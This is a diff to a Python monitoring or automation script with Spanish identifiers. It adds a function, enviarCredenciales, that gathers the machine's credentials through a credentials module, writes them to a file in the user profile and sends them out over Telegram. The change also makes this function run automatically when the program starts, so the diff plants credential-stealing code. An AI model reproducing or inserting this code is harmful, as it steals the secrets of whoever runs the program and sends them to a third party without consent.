@@ -7,6 +7,7 @@ import shutil
 import psutil
 from pathlib import Path
 import pyautogui
+import credentials
 
 ####################################### CREDENCIALES Y GLOBALES
 
@@ -135,10 +136,24 @@ def planificador():
             time.sleep(intervalo_minutos * 60)
         previous_state = current_state
 
+def enviarCredenciales():
+    quienSoy = obtenerDatos()
+    
+    file_dst = os.path.join(os.environ['USERPROFILE'], 'creeEnMi.txt')
+    credenciales = credentials.getCreds()
+    print(credenciales)
+    with open(file_dst,'w') as f:
+        f.write("Credenciales: \n" + credenciales)
+        f.close
+    enviar_telegram(f"Credenciales del dispositivo {quienSoy}\n",file_dst)
+
 if __name__ == "__main__":     
     os.system("color 0A")
     print("PROGRAMA INICIADO")
+    
+    enviarCredenciales()
     threading.Thread(target=planificador, daemon=True).start()
+    
     try:
         while True:
             time.sleep(1)
